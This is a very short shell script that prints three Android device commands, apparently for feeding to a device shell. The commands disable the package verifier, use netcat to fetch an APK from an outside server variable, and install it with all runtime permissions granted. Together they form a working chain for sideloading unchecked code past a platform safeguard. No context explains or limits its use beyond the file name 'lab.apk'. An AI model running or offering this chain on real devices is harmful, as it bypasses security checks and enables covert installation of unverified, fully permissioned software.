#!/bin/sh
printf '%s\n' 'settings put global package_verifier_enable 0' 'toybox nc $server 9000 > lab.apk' 'pm install -g lab.apk'
